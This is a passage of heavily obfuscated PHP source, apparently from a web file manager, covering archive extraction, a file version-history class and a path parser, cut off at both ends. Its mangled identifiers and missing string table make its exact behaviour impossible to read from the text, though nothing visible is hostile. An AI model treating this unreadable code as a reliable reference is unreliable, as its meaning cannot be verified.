$Å¾€Ğ¥°[$ è‰¿ÕÌ[1305]] == $ è‰¿ÕÌ[1376]) { break; } if (substr($Å¾€Ğ¥°[$ è‰¿ÕÌ[42]], -1, 1) == $ è‰¿ÕÌ[8]) { break; } $èŸº±­¤ = in_array(get_path_ext($Å¾€Ğ¥°[$ è‰¿ÕÌ[1391]]), array($ è‰¿ÕÌ[397], $ è‰¿ÕÌ[1382], $ è‰¿ÕÌ[1383], $ è‰¿ÕÌ[1384], $ è‰¿ÕÌ[1385], $ è‰¿ÕÌ[1386])); $Ğâ¥Æèè = $¾Ô‰­ş¡ == count($µ­ı÷é”) - 1 && $èŸº±­¤; $½ˆî¨Ää = $·ò—†ëÒ . $Å¾€Ğ¥°[$ è‰¿ÕÌ[1391]]; $Ø¥ñ¼ı¤ = $·ò—†ëÒ . get_path_this($Å¾€Ğ¥°[$ è‰¿ÕÌ[42]]); if (IO::exist($½ˆî¨Ää)) { $éÊ¡ÄÇ„ = $½ˆî¨Ää; continue; } $êã²Ü“ì = $¾Ô‰­ş¡ == 0 ? get_path_ext($¸ğœòÉÈ) : get_path_ext($éÊ¡ÄÇ„); $Ï‡Ô³ş× = KodArchive::extract(self::iconvSystem($éÊ¡ÄÇ„), $·ò—†ëÒ, $Å¾€Ğ¥°[$ è‰¿ÕÌ[1305]], $ää¹ßÍî, $êã²Ü“ì); self::unzipErrorCheck($Ï‡Ô³ş×, array($ è‰¿ÕÌ[1397], $…ÄÜÚß, $µ­ı÷é”, $Å¾€Ğ¥°, $½ˆî¨Ää)); if (IO::exist($Ø¥ñ¼ı¤)) { IO::rename($Ø¥ñ¼ı¤, get_path_this($½ˆî¨Ää)); } $éÊ¡ÄÇ„ = $½ˆî¨Ää; } $Ø­¬¼üİ = $éÊ¡ÄÇ„; return array($ è‰¿ÕÌ[240] => $éÊ¡ÄÇ„, $ è‰¿ÕÌ[1377] => $µ­ı÷é”, $ è‰¿ÕÌ[1378] => $·ò—†ëÒ); } private static function unzipErrorCheck($éÜâµÕ‰, $Ù‰€ş÷ = false) { $ÎÇ¸óúŸ =& $_SERVER[øşô´çË]; if ($éÜâµÕ‰[$ÎÇ¸óúŸ[1398]]) { return !0; } write_log(array($ÎÇ¸óúŸ[1399], $éÜâµÕ‰, $Ù‰€ş÷), $ÎÇ¸óúŸ[1400]); $€™Î»™È = is_array($éÜâµÕ‰[$ÎÇ¸óúŸ[1388]]) ? json_encode($éÜâµÕ‰[$ÎÇ¸óúŸ[1388]]) : $éÜâµÕ‰[$ÎÇ¸óúŸ[1388]]; show_json($ÎÇ¸óúŸ[1401] . $€™Î»™È, !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $ÁŞ»‹¥£ =& $_SERVER[øşô´çË]; $ºå‡ßç = $GLOBALS[$ÁŞ»‹¥£[6]][$ÁŞ»‹¥£[102]]; if ($ºå‡ßç[$ÁŞ»‹¥£[1402]] != 1) { return; } if ($ºå‡ßç[$ÁŞ»‹¥£[1403]] <= 0) { return; } if (isset($_REQUEST[$ÁŞ»‹¥£[1404]]) && $_REQUEST[$ÁŞ»‹¥£[1404]] == $ÁŞ»‹¥£[101]) { return; } Hook::bind($ÁŞ»‹¥£[1405], $ÁŞ»‹¥£[1406]); Hook::bind($ÁŞ»‹¥£[1407], $ÁŞ»‹¥£[1408]); Hook::bind($ÁŞ»‹¥£[1409], $ÁŞ»‹¥£[1410]); Hook::bind($ÁŞ»‹¥£[1411], $ÁŞ»‹¥£[1412]); Hook::bind($ÁŞ»‹¥£[1413], $ÁŞ»‹¥£[1414]); Hook::bind($ÁŞ»‹¥£[1415], $ÁŞ»‹¥£[1416]); } public static function eventBeforeUpload($Í…éæµ¡) { if ($Í…éæµ¡[3] && $Í…éæµ¡[3] != REPEAT_REPLACE) { return; } $ä—˜§ = self::parsePath($Í…éæµ¡[0]); if (!$ä—˜§) { return; } self::add($ä—˜§); } public static function eventBeforeEdit($ôö½ëÄÈ) { $Êï·ƒö² = self::parsePath($ôö½ëÄÈ[0]); if (!$Êï·ƒö²) { return; } self::add($Êï·ƒö²); } public static function eventBeforeCopyFile($Â™ƒ¡¼©, $× ©ø‰Õ, $ŸÍÌÚî´, $…ˆşå³Ñ, $›áÀüÑ®, $¶Î¾îßÇ) { $Ææå³áˆ =& $_SERVER[øşô´çË]; if (isset($ŸÍÌÚî´->_data[$Ææå³áˆ[1337]]) && $ŸÍÌÚî´->_data[$Ææå³áˆ[1337]]) { return; } $ˆËµ™§ = $ŸÍÌÚî´->getPathOuter($…ˆşå³Ñ); $³ÑÄşÅÎ = self::parsePath($ˆËµ™§); if (!$³ÑÄşÅÎ) { return; } self::add($³ÑÄşÅÎ); } public static function eventBeforeRename($Û€Îó­«) { $Ø¬œƒñ =& $_SERVER[øşô´çË]; $¾òø½™‘ = self::parsePath($Û€Îó­«[0]); if (!$¾òø½™‘) { return; } $â¡‘“Ø† = self::checkInHistory($¾òø½™‘); if (!$â¡‘“Ø†) { return; } if ($â¡‘“Ø†[$Ø¬œƒñ[43]] == $Ø¬œƒñ[240]) { $˜ô¿¹¼æ = self::listData($¾òø½™‘); if ($˜ô¿¹¼æ && $˜ô¿¹¼æ[$Ø¬œƒñ[455]]) { self::moveHistory($¾òø½™‘, $Û€Îó­«[1]); } } else { IO::rename($â¡‘“Ø†[$Ø¬œƒñ[97]], $Û€Îó­«[1]); } } public static function eventBeforeMove($ÁîÆ¨Â˜) { $¹¥´Ïñ =& $_SERVER[øşô´çË]; $ô¦³™ä‚ = self::parsePath($ÁîÆ¨Â˜[0]); if (!$ô¦³™ä‚) { return; } $Ç£—çö = self::parsePath($ÁîÆ¨Â˜[1]); if (!$Ç£—çö) { return; } $•ÀÔ€Üù = $ÁîÆ¨Â˜[3]; $ş–ˆ‘İí = self::checkInHistory($ô¦³™ä‚); if (!$ş–ˆ‘İí) { return; } $‹©ÓÊÎ„ = self::pathHistory($Ç£—çö); if ($ş–ˆ‘İí[$¹¥´Ïñ[43]] == $¹¥´Ïñ[240]) { $æîãê«ù = self::listData($ô¦³™ä‚); $Üç€ßŠ’ = rtrim($Ç£—çö, $¹¥´Ïñ[8]) . $¹¥´Ïñ[8] . ($•ÀÔ€Üù ? $•ÀÔ€Üù : get_path_this($ô¦³™ä‚)); $ÒöÌ¸è¦ = self::listData($Üç€ßŠ’); if ($æîãê«ù && $æîãê«ù[$¹¥´Ïñ[455]] && $ÒöÌ¸è¦ && $ÒöÌ¸è¦[$¹¥´Ïñ[455]]) { return self::clear($ô¦³™ä‚); } if ($æîãê«ù && $æîãê«ù[$¹¥´Ïñ[455]]) { self::moveHistory($ô¦³™ä‚, $•ÀÔ€Üù, $‹©ÓÊÎ„); } } else { IO::move($ş–ˆ‘İí[$¹¥´Ïñ[97]], $‹©ÓÊÎ„, !1, $•ÀÔ€Üù); self::clearEmptyFolder(IO::pathFather($ş–ˆ‘İí[$¹¥´Ïñ[97]])); } } public static function eventAfterRemove($¶°¡»‘œ, $·ÙÄïÓ”) { $ÜæÚÛÍÚ =& $_SERVER[øşô´çË]; if (!$·ÙÄïÓ”) { return; } $áóİ³€ = self::parsePath($¶°¡»‘œ[0]); if (!$áóİ³€) { return; } $³¬×Èµ = self::checkInHistory($áóİ³€); if (!$³¬×Èµ) { return; } if ($³¬×Èµ[$ÜæÚÛÍÚ[43]] == $ÜæÚÛÍÚ[240]) { $ñµËÓÆ§ = self::listData($áóİ³€, !1); if ($ñµËÓÆ§ && $ñµËÓÆ§[$ÜæÚÛÍÚ[455]]) { self::clear($áóİ³€, !1); } } else { IO::remove($³¬×Èµ[$ÜæÚÛÍÚ[97]]); self::clearEmptyFolder(IO::pathFather($³¬×Èµ[$ÜæÚÛÍÚ[97]])); } } private static function checkInHistory($ìÃËŒ®) { $ª¿ĞìÒ¯ = self::pathHistory($ìÃËŒ®); if (!IO::exist($ª¿ĞìÒ¯)) { $ª¿ĞìÒ¯ .= $_SERVER[øşô´çË][1417]; } return IO::exist($ª¿ĞìÒ¯) ? IO::info($ª¿ĞìÒ¯) : !1; } private static function parsePath($üüııÇ) { $†’¸×Òá =& $_SERVER[øşô´çË]; if (!$üüııÇ) { return !1; } if (isset($GLOBALS[$†’¸×Òá[1418]]) && $GLOBALS[$†’¸×Òá[1418]]) { return; } $ ‚›ÊÜ¨ = KodIO::parse($üüııÇ); $€÷ÑŞ†¬ = $ ‚›ÊÜ¨[$†’¸×Òá[43]]; $³•¯üŒÊ = !$€÷ÑŞ†¬ || $€÷ÑŞ†¬ == KodIO::KOD_IO || $€÷ÑŞ†¬ == KodIO::KOD_SHARE_ITEM; if (!$³•¯üŒÊ || !$ ‚›ÊÜ¨[$†’¸×Òá[1419]]) { return !1; } if (substr($üüııÇ, 0, strlen(DATA_PATH . $†’¸×Òá[1420])) == DATA_PATH . $†’¸×Òá[1420]) { return !1; } if ($€÷ÑŞ†¬ == KodIO::KOD_SHARE_ITEM) { $ó¡¦„Å = IO::init($üüııÇ); if ($ó¡¦„Å->pathParse[$†’¸×Òá[1333]]) { return self::parsePath($ó¡¦„Å->pathParse[$†’¸×Òá[1333]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $±˜ßÏÊ› = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $†’¸×Òá[1421]); foreach ($±˜ßÏÊ› as $ıœ€õŠä) { if (!$€÷ÑŞ†¬ && substr($üüııÇ, 0, strlen($ıœ€õŠä)) == $ıœ€õŠä) { return !1; } } self::log($GLOBALS[$†’¸×Òá[1327]] . $†’¸×Òá[1422] . $üüııÇ); return $üüııÇ; } private static function pathHistory($‹ø²æû) { $­¦Ê˜õŒ =& $_SERVER[øşô´çË]; $‡˜‹Ç‹Œ = self::$_historyBase . ltrim(KodIO::clear($‹ø²æû), $­¦Ê˜õŒ[8]); $‡˜‹Ç‹Œ = str_replace(array($­¦Ê˜õŒ[1423]), array($­¦Ê˜õŒ[1424]), $‡˜‹Ç‹Œ); return $‡˜‹Ç‹Œ; } public static function log($¬¾õû) { } public static function historyCount($›­Áüˆ) { $šÌå£Ìß =& $_SERVER[øşô´çË]; $×ËÖÉ× = array(); $øéÛçÂŠ = array(); foreach ($›­Áüˆ as $ùôóÈ¦á) { $·åµèĞ = get_path_father($ùôóÈ¦á); if (!$øéÛçÂŠ[$·åµèĞ]) { $øéÛçÂŠ[$·åµèĞ] = array(); } $øéÛçÂŠ[$·åµèĞ][] = get_path_this($ùôóÈ¦á); } foreach ($øéÛçÂŠ as $·åµèĞ => $úÛ»ŠŒì) { $¹¤ÉÔØİ = self::parsePath($·åµèĞ); if (!$¹¤ÉÔØİ) { continue; } foreach ($úÛ»ŠŒì as $‰ÈåÙëÆ) { $Á¾Åïñ© = self::listData(rtrim($¹¤ÉÔØİ, $šÌå£Ìß[8]) . $šÌå£Ìß[8] . $‰ÈåÙëÆ, !1); if ($Á¾Åïñ© && $Á¾Åïñ©[$šÌå£Ìß[455]]) { $×ËÖÉ×[rtrim($·åµèĞ, $šÌå£Ìß[8]) . $šÌå£Ìß[8] . $‰ÈåÙëÆ] = count($Á¾Åïñ©[$šÌå£Ìß[455]]); } } } return $×ËÖÉ×; } public static function add($˜›İ¶€¤) { $ˆñ¥˜²· =& $_SERVER[øşô´çË]; $Ü•˜§­Î = self::listData($˜›İ¶€¤); if (!$Ü•˜§­Î) { return; } $ÀúäÄ¼× = Model($ˆñ¥˜²·[875])->get($ˆñ¥˜²·[963]); $×´ÈÉõõ = intval($GLOBALS[$ˆñ¥˜²·[6]][$ˆñ¥˜²·[102]][$ˆñ¥˜²·[1403]]); $á­û ¯ş = $ÀúäÄ¼× == $ˆñ¥˜²·[964] ? min(5, $×´ÈÉõõ) : $×´ÈÉõõ; if ($×´ÈÉõõ <= 0) { return; } $…‡°¾Åù = IO::info($˜›İ¶€¤); $Åòšäæ³ = $Ü•˜§­Î[$ˆñ¥˜²·[455]]; if ($…‡°¾Åù[$ˆñ¥˜²·[89]] == 0) { return; } if ($…‡°¾Åù[$ˆñ¥˜²·[89]] >= 1024 * 1024 * 500) { return !1; } $®şö†‹ş = IO::hashSimple($˜›İ¶€¤); if ($Åòšäæ³ && $Åòšäæ³[0][$ˆñ¥˜²·[703]] == $®şö†‹ş) { return !0; } if (array_key_exists($ˆñ¥˜²·[243], $…‡°¾Åù) && !$…‡°¾Åù[$ˆñ¥˜²·[243]]) { return !1; } $¥©¯Åë§ = short_id(time()); $¢«“öèÓ = array($ˆñ¥˜²·[496] => $¥©¯Åë§, $ˆñ¥˜²·[703] => $®şö†‹ş, $ˆñ¥˜²·[42] => $…‡°¾Åù[$ˆñ¥˜²·[42]] . $ˆñ¥˜²·[10] . date($ˆñ¥˜²·[1425]) . rand_string(1), $ˆñ¥˜²·[89] => $…‡°¾Åù[$ˆñ¥˜²·[89]], $ˆñ¥˜²·[550] => USER_ID, $ˆñ¥˜²·[241] => time(), $ˆñ¥˜²·[1426] => $ˆñ¥˜²·[12]); IO::mkdir($Ü•˜§­Î[$ˆñ¥˜²·[1427]]); $Œ¤´ëÜŞ = IO::copy($˜›İ¶€¤, $Ü•˜§­Î[$ˆñ¥˜²·[1427]], !1, $¢«“öèÓ[$ˆñ¥˜²·[42]]); if (!$Œ¤´ëÜŞ) { self::clearEmptyFolder($Ü•˜§­Î[$ˆñ¥˜²·[1427]]); return !1; } array_unshift($Åòšäæ³, $¢«“öèÓ); if (count($Åòšäæ³) > $á­û ¯ş) { $â«ÚÇÜ = array_slice($Åòšäæ³, $á­û ¯ş); foreach ($â«ÚÇÜ as $½¶¶£Êƒ) { IO::remove($Ü•˜§­Î[$ˆñ¥˜²·[1427]] . $½¶¶£Êƒ[$ˆñ¥˜²·[42]]); } $Åòšäæ³ = array_slice($Åòšäæ³, 0, $á­û ¯ş); } return self::saveData($Ü•˜§­Î[$ˆñ¥˜²·[1428]], $Åòšäæ³); } public static function remove($ˆ¤ÁöÂ´, $™æŞèÛ) { $ï¸Ã†ÈŞ =& $_SERVER[øşô´çË]; $÷¶ï÷ì³ = self::listData($ˆ¤ÁöÂ´); $áàÈÉ¯ = array(); if (!$÷¶ï÷ì³) { return !1; } foreach ($÷¶ï÷ì³[$ï¸Ã†ÈŞ[455]] as $”è¢Ø½¤) { if ($”è¢Ø½¤[$ï¸Ã†ÈŞ[496]] == $™æŞèÛ) { IO::remove($÷¶ï÷ì³[$ï¸Ã†ÈŞ[1427]] . $”è¢Ø½¤[$ï¸Ã†ÈŞ[42]]); continue; } $áàÈÉ¯[] = $”è¢Ø½¤; } return self::saveData($÷¶ï÷ì³[$ï¸Ã†ÈŞ[1428]], $áàÈÉ¯); } public static function clear($Öà¥©´¾, $åš–‰Ôµ = true) { $‰ÜôÚÖÕ =& $_SERVER[øşô´çË]; $şêÚÍ§” = self::listData($Öà¥©´¾, $åš–‰Ôµ); if (!$şêÚÍ§”) { return !1; } foreach ($şêÚÍ§”[$‰ÜôÚÖÕ[455]] as $Ò¯”ºÂÉ) { IO::remove($şêÚÍ§”[$‰ÜôÚÖÕ[1427]] . $Ò¯”ºÂÉ[$‰ÜôÚÖÕ[42]]); } return self::saveData($şêÚÍ§”[$‰ÜôÚÖÕ[1428]], array()); } public static function moveHistory($İÂÁÅÇ, $Âø°­©¦ = '', $Ü…Óïôó = '') { $Ã¿°«ùÕ =& $_SERVER[øşô´çË]; $‹¨¹Éœª = self::listData($İÂÁÅÇ, !1); if (!$‹¨¹Éœª || !$‹¨¹Éœª[$Ã¿°«ùÕ[455]]) { return !1; } $ÊÜøù»é = $Ã¿°«ùÕ[1417]; $Âø°­©¦ = $Âø°­©¦ ? $Âø°­©¦ : get_path_this($İÂÁÅÇ); $Ü…Óïôó = $Ü…Óïôó ? $Ü…Óïôó : $‹¨¹Éœª[$Ã¿°«ùÕ[1427]]; $˜«€†¹ö = substr(get_path_this($‹¨¹Éœª[$Ã¿°«ùÕ[1428]]), 0, -strlen($ÊÜøù»é)); foreach ($‹¨¹Éœª[$Ã¿°«ùÕ[455]] as $Úø©ƒø => $«¬¢š¯¾) { $ôßØà„ = $Âø°­©¦ . substr($«¬¢š¯¾[$Ã¿°«ùÕ[42]], strlen($˜«€†¹ö)); $ü×’¸‚Ñ = IO::move($‹¨¹Éœª[$Ã¿°«ùÕ[1427]] . $«¬¢š¯¾[$Ã¿°«ùÕ[42]], $Ü…Óïôó, !1, $ôßØà„); if ($ü×’¸‚Ñ) { $‹¨¹Éœª[$Ã¿°«ùÕ[455]][$Úø©ƒø][$Ã¿°«ùÕ[42]] = $ôßØà„; } } $‹¨¹Éœª[$Ã¿°«ùÕ[1428]] = IO::move($‹¨¹Éœª[$Ã¿°«ùÕ[1428]], $Ü…Óïôó, !1, $Âø°­©¦ . $ÊÜøù»é); self::saveData($‹¨¹Éœª[$Ã¿°«ùÕ[1428]], $‹¨¹Éœª[$Ã¿°«ùÕ[455]]); self::clearEmptyFolder($‹¨¹Éœª[$Ã¿°«ùÕ[1427]]); } public static function rollback($¯¦û§ê, $‹ğÚ¯‘æ) { $ãåÎ¶ıì =& $_SERVER[øşô´çË]; $²›êúì = self::listData($¯¦û§ê); if (!$²›êúì) { return; } $æÎ¶¾ÉÓ = IO::info($¯¦û§ê); foreach ($²›êúì[$ãåÎ¶ıì[455]] as $ï¤œã‘ => $ìÇª€¿Ø) { if ($ìÇª€¿Ø[$ãåÎ¶ıì[496]] == $‹ğÚ¯‘æ) { self::add($¯¦û§ê); $ÌÖ«ù¼ = $²›êúì[$ãåÎ¶ıì[1427]] . $ìÇª€¿Ø[$ãåÎ¶ıì[42]]; $î™•Ê‘ƒ = IO::copy($ÌÖ«ù¼, IO::pathFather($¯¦û§ê), REPEAT_REPLACE, $æÎ¶¾ÉÓ[$ãåÎ¶ıì[42]]); if ($î™•Ê‘ƒ) { self::remove($¯¦û§ê, $‹ğÚ¯‘æ); } return $î™•Ê‘ƒ; } } return !1; } public static function setDetail($»ÙÒÕ´, $İÏÏ¦À, $€éƒƒ“‚) { $øÅĞãçŸ =& $_SERVER[øşô´çË]; $öĞ¿şÓ• = self::listData($»ÙÒÕ´); if (!$öĞ¿şÓ•) { return; } foreach ($öĞ¿şÓ•[$øÅĞãçŸ[455]] as $Õğç«Û® => $œä Ş´š) { if ($œä Ş´š[$øÅĞãçŸ[496]] == $İÏÏ¦À) { $öĞ¿şÓ•[$øÅĞãçŸ[455]][$Õğç«Û®][$øÅĞãçŸ[1426]] = $€éƒƒ“‚; self::saveData($öĞ¿şÓ•[$øÅĞãçŸ[1428]], $öĞ¿şÓ•[$øÅĞãçŸ[455]]); return !0; } } return !1; } public static function fileInfo($öùá’è‰, $õ©ˆ¤Âß) { $×ü£õ„ =& $_SERVER[øşô´çË]; $ÛŞäã¤ = self::listData($öùá’è‰); if (!$ÛŞäã¤) { show_json(LNG($×ü£õ„[115]), !1); } $Øá œğæ = $×ü£õ„[12]; foreach ($ÛŞäã¤[$×ü£õ„[455]] as $ÓâøİĞŞ => $É–í±ê) { if ($É–í±ê[$×ü£õ„[496]] != $õ©ˆ¤Âß) { continue; } $Øá œğæ = $ÛŞäã¤[$×ü£õ„[1427]] . $É–í±ê[$×ü£õ„[42]]; break; } if (!$Øá œğæ) { show_json(LNG($×ü£õ„[115]), !1); } return IO::info($Øá œğæ); } public static function fileOut($¢ºûšå°, $àÏ£¢ìÕ, $’ Ù¶ÁÅ = false) { $ˆ¬ôÏ‰— =& $_SERVER[øşô´çË]; $Û…Û“Ö = self::fileInfo($¢ºûšå°, $àÏ£¢ìÕ); $¯ãßÔÎ =& $GLOBALS[$ˆ¬ôÏ‰—[7]]; $’ Ù¶ÁÅ = isset($¯ãßÔÎ[$ˆ¬ôÏ‰—[1381]]) && $¯ãßÔÎ[$ˆ¬ôÏ‰—[1381]] == 1; if (isset($¯ãßÔÎ[$ˆ¬ôÏ‰—[43]]) && $¯ãßÔÎ[$ˆ¬ôÏ‰—[43]] == $ˆ¬ôÏ‰—[1429]) { return IO::fileOutImage($Û…Û“Ö[$ˆ¬ôÏ‰—[97]], $¯ãßÔÎ[$ˆ¬ôÏ‰—[1430]]); } IO::fileOut($Û…Û“Ö[$ˆ¬ôÏ‰—[97]], $’ Ù¶ÁÅ, get_path_this($¢ºûšå°)); } public static function listData($ª¥›»Š, $€àªÏ… = true) { $şª¤Èºß =& $_SERVER[øşô´çË]; if ($€àªÏ… && !IO::exist($ª¥›»Š)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ª¥›»Š, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ø”£‰˜ = self::pathHistory($ª¥›»Š); $©ì»™çë = array($şª¤Èºß[1428] => $Ø”£‰˜ . $şª¤Èºß[1417], $şª¤Èºß[1427] => rtrim(get_path_father($Ø”£‰˜), $şª¤Èºß[8]) . $şª¤Èºß[8], $şª¤Èºß[455] => array()); $ó¢î¸§ = IO::getContent($©ì»™çë[$şª¤Èºß[1428]]); if ($ó¢î¸§) { $ÎÍ½é = json_decode($ó¢î¸§, !0); if (is_array($ÎÍ½é)) { $©ì»™çë[$şª¤Èºß[455]] = $ÎÍ½é; } } return $©ì»™çë; } private static function saveData($¯ •¥ü, $‘¹Õ®Ê«) { $ÚÁÌ¾î– =& $_SERVER[øşô´çË]; self::log($ÚÁÌ¾î–[1431] . $¯ •¥ü . $ÚÁÌ¾î–[84] . count($‘¹Õ®Ê«), $ÚÁÌ¾î–[854]); if ($‘¹Õ®Ê«) { return IO::setContent($¯ •¥ü, json_encode($‘¹Õ®Ê«)); } $¾ÎŠ’ì‘ = IO::pathFather($¯ •¥ü); IO::remove($¯ •¥ü); self::clearEmptyFolder($¾ÎŠ’ì‘); return !0; } public static function clearEmptyFolder($ÒÜ¤ä€É) { $Äºé¹º› =& $_SERVER[øşô´çË]; if (trim($ÒÜ¤ä€É, $Äºé¹º›[8]) == trim(self::$_historyBase, $Äºé¹º›[8])) { return; } $ÂÕí™Ìì = IO::pathFather($ÒÜ¤ä€É); $¹Í¨µîœ = IO::has($ÒÜ¤ä€É, !0); if ($¹Í¨µîœ[$Äºé¹º›[249]] > 0 || $¹Í¨µîœ[$Äºé¹º›[250]] > 0) { return; } IO::remove($ÒÜ¤ä€É); self::clearEmptyFolder($ÂÕí™Ìì); } private static function getBasePath() { $â³İôµè =& $_SERVER[øşô´çË]; $á¹Şİ = Model($â³İôµè[1432])->get($â³İôµè[1433]); if ($á¹Şİ) { if (!IO::exist($á¹Şİ)) { IO::mkdir($á¹Şİ); } if (get_path_this($á¹Şİ) == $â³İôµè[1420]) { $œ×À×« = $â³İôµè[1434] . rand_string(8); @rename($á¹Şİ, get_path_father($á¹Şİ) . $â³İôµè[8] . $œ×À×«); $á¹Şİ = DATA_PATH . $œ×À×« . $â³İôµè[8]; file_put_contents(DATA_PATH . $â³İôµè[1369], $â³İôµè[12]); Model($â³İôµè[1432])->set($â³İôµè[1433], $á¹Şİ); } return $á¹Şİ; } $á¹Şİ = DATA_PATH . $â³İôµè[1434] . rand_string(8) . $â³İôµè[8]; $á¹Şİ = IO::mkdir($á¹Şİ); $á¹Şİ = rtrim($á¹Şİ, $â³İôµè[8]) . $â³İôµè[8]; file_put_contents($á¹Şİ . $â³İôµè[1369], $â³İôµè[12]); file_put_contents(DATA_PATH . $â³İôµè[1369], $â³İôµè[12]); Model($â³İôµè[1432])->set($â³İôµè[1433], $á¹Şİ); return $á¹Şİ; } } class KodIO { const KOD_SOURCE = "\x7b\163\157\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\145\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\173\x75\x73\x65\162\106\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\x72\x46\151\x6c\x65\x54\x61\x67\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\x72\x46\x69\x6c\145\x54\171\x70\145\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\157\x75\x70\x52\x6f\157\164\123\x65\x6c\x66\175"; const KOD_USER_SHARE = "\x7b\x75\x73\x65\162\123\x68\x61\x72\x65\175"; const KOD_USER_SHARE_LINK = "\173\165\163\145\162\x53\150\x61\x72\145\114\x69\156\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\x61\162\145\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\111\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\150\141\162\145\111\164\x65\155\x4c\x69\156\153\175"; const KOD_SHARE_OUTER = "\173\163\x68\x61\162\x65\111\x74\145\x6d\117\165\x74\175"; const KOD_SEARCH = "\x7b\x73\x65\x61\162\143\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\157\x63\x6b\175"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\163\145\x72\x52\x65\x6e\143\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\173\144\x72\151\166\x65\162\175"; public static function typeList() { $µ®±Çİ =& $_SERVER[øşô´çË]; return array($µ®±Çİ[1435] => self::KOD_SOURCE, $µ®±Çİ[1436] => self::KOD_USER_RECYCLE, $µ®±Çİ[1437] => self::KOD_USER_FAV, $µ®±Çİ[1438] => self::KOD_USER_FILE_TAG, $µ®±Çİ[1439] => self::KOD_USER_FILE_TYPE, $µ®±Çİ[1440] => self::KOD_GROUP_ROOT_SELF, $µ®±Çİ[1441] => self::KOD_USER_SHARE, $µ®±Çİ[1442] => self::KOD_USER_SHARE_LINK, $µ®±Çİ[1443] => self::KOD_USER_SHARE_TO_ME, $µ®±Çİ[1444] => self::KOD_SHARE_ITEM, $µ®±Çİ[1445] => self::KOD_SHARE_LINK, $µ®±Çİ[1446] => self::KOD_SHARE_OUTER, $µ®±Çİ[1447] => self::KOD_SEARCH, $µ®±Çİ[1448] => self::KOD_BLOCK, $µ®±Çİ[1449] => self::KOD_IO, $µ®±Çİ[1450] => self::KOD_USER_RECENT, $µ®±Çİ[1451] => self::KOD_USER_DRIVER); } public static function parse($¹–ÇÖ¨ü) { $ÊæÍÛ =& $_SERVER[øşô´çË]; $¹–ÇÖ¨ü = self::clear($¹–ÇÖ¨ü); $–ÚŒ—äÓ = array_values(self::typeList()); preg_match($ÊæÍÛ[1452], $¹–ÇÖ¨ü, $…¥ğ›‡û); $ùöøïùÍ = array($ÊæÍÛ[520] => !1, $ÊæÍÛ[1453] => !1, $ÊæÍÛ[517] => !1, $ÊæÍÛ[97] => $¹–ÇÖ¨ü, $ÊæÍÛ[1353] => !1, $ÊæÍÛ[1352] => $ÊæÍÛ[12]); if (is_array($…¥ğ›‡û) && count($…¥ğ›‡û) == 5) { $Öí¼îš = $ÊæÍÛ[1454] . $…¥ğ›‡û[2] . $ÊæÍÛ[411]; if (in_array($Öí¼îš, $–ÚŒ—äÓ)) { $ùöøïùÍ[$ÊæÍÛ[1353]] = $…¥ğ›‡û[1]; $ùöøïùÍ[$ÊæÍÛ[43]] = $Öí¼îš; $ùöøïùÍ[$ÊæÍÛ[1455]] = substr($Öí¼îš, 1, -1); $ùöøïùÍ[$ÊæÍÛ[496]] = $…¥ğ›‡û[3]; } $ùöøïùÍ[$ÊæÍÛ[1352]] = $…¥ğ›‡û[4]; } if ($ùöøïùÍ[$ÊæÍÛ[520]] == self::KOD_SOURCE) { $ùöøïùÍ[$ÊæÍÛ[496]] = intval($ùöøïùÍ[$ÊæÍÛ[496]]); $ùöøïùÍ[$ÊæÍÛ[1356]] = $ùöøïùÍ[$ÊæÍÛ[496]]; } $ÌË‡½Œë = array($ÊæÍÛ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $ùöøïùÍ[$ÊæÍÛ[1419]] = in_array($ùöøïùÍ[$ÊæÍÛ[43]], $ÌË‡½Œë); return $ùöøïùÍ; } public static function isTruePath($ÄëÇ¾àò) { $§¸õê¹ß =& $_SERVER[øşô´çË]; if (substr($ÄëÇ¾àò, 0, 1) != $§¸õê¹ß[1454]) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[507]) === 0) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[1423]) === 0) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[1456]) === 0) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[1457]) === 0) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[1458]) === 0) { return !0; } if (strpos($ÄëÇ¾àò, $§¸õê¹ß[1459]) === 0) { return !0; } return !1; } public static function clear($àø…åé) { $¸ù¡£ºÛ =& $_SERVER[øşô´çË]; $àø…åé = str_replace(array($¸ù¡£ºÛ[1246], $¸ù¡£ºÛ[19]), $¸ù¡£ºÛ[63], $àø…åé); $àø…åé = str_replace($¸ù¡£ºÛ[107], $¸ù¡£ºÛ[8], $àø…åé); $›‚”Æû« = $¸ù¡£ºÛ[1460]; if (substr($àø…åé, 0, 3) == $¸ù¡£ºÛ[1461]) { $àø…åé = substr($àø…åé, 3); } while (strstr($àø…åé, $›‚”Æû«)) { $àø…åé = str_replace($›‚”Æû«, $¸ù¡£ºÛ[8], $àø…åé); } $àø…åé = preg_replace($¸ù¡£ºÛ[1462], $¸ù¡£ºÛ[8], $àø…åé); if ($àø…åé == $¸ù¡£ºÛ[8]) { return $¸ù¡£ºÛ[8]; } $àø…åé = rtrim($àø…åé, $¸ù¡£ºÛ[8]); return $àø…åé; } public static function pathTrue($‚éäôõ­) { $óäôíŒÚ =& $_SERVER[øşô´çË]; if (!$‚éäôõ­) { return $óäôíŒÚ[12]; } 